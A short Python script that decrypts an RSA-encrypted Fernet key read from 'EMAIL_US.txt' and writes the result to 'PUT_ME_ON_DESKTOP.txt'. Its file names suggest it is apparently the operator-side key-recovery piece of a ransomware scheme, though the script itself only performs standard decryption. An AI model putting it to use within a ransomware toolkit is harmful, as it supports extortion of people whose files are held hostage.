from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import getpass

def decrypt_key(file_path, private_key_path):
    try:
        with open(file_path, 'rb') as encrypted_file:
            enc_fernet_key = encrypted_file.read()

        passphrase = getpass.getpass("Enter passphrase for private key: ")
        private_key = RSA.import_key(open(private_key_path).read(), passphrase=passphrase)
        private_crypter = PKCS1_OAEP.new(private_key)
        dec_fernet_key = private_crypter.decrypt(enc_fernet_key)

        with open('PUT_ME_ON_DESKTOP.txt', 'wb') as decrypted_file:
            decrypted_file.write(dec_fernet_key)

        print('Decryption Completed')
    except Exception as e:
        print(f"Error during decryption: {e}")

if __name__ == "__main__":
    decrypt_key('EMAIL_US.txt', 'private.pem')